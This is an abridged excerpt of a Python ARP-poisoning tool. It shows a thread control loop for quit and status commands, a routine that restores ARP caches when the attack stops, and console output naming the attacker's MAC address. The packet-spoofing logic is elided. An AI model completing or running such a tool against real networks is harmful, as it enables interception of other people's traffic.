...
def start_poison_thread(targets, gateway, control_queue, attacker_MAC):
    ...
    while not finish:
        ...
        try:
            ...
            # queue. Something clearly is not working as it
            # should...
            print("Something went wrong, yout queue idea sucks.")

        cmd = item[CMD].lower()
        if cmd in ["quit", "exit", "stop", "leave"]:
            # commands to terminate the thread received.
            finish = True
        ...
        elif cmd in ["show", "status", "list"]:
            print("Current targets:")
            print("Gateway: %s (%s)" % gateway)
            for t in targets:
                print("%s (%s)" % t)

    # we're done, reset every host
    restore_ARP_caches(targets, gateway)

def restore_ARP_caches(targets, gateway, verbose=True):
    # send correct ARP responses to targets and gateway
    print("Stopping the attack, restoring the ARP cache.")
    for i in range(3):
        if verbose:
        ...
        time.sleep(1)
    print("\033[1;32mRestored ARP caches.\033[0m")
...
def main():
    ...
    print("Using interface: \033[1;31m%s\033[0m (%s)" % (interface, attacker_MAC))
    try:
